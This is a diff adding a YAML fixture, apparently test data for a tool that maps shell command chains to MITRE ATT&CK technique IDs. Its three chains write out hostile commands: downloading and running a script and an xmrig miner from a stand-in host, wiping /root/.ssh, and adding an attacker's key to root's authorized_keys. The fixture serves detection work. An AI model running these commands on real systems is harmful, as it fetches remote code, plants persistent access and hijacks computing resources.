@@ -1,0 +1,21 @@
+version: "1"
+chains:
+  - id: dropper
+    steps:
+      - "cd /tmp"
+      - "wget http://198.51.100.7/malicious_script.sh"
+      - "chmod 777 malicious_script.sh"
+      - "bash malicious_script.sh"
+    expected_technique_ids: ["T1105", "T1222.002", "T1059.004"]
+  - id: ssh_persistence
+    steps:
+      - "rm -rf /root/.ssh"
+      - "mkdir -p /root/.ssh"
+      - "echo ssh-rsa AAAAB3Nza attacker@host >> /root/.ssh/authorized_keys"
+    expected_technique_ids: ["T1098.004"]
+  - id: miner
+    steps:
+      - "wget http://198.51.100.7/xmrig"
+      - "chmod 777 xmrig"
+      - "./xmrig"
+    expected_technique_ids: ["T1105", "T1222.002", "T1496"]
